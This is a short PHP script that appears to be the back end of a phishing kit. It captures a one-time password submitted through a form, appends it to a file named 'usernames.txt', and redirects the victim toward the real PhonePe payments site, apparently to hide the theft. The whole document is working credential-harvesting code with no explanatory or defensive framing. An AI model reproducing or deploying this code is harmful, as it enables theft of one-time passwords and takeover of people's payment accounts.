<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.phonepe.com
header("Location: $url");
exit();
?>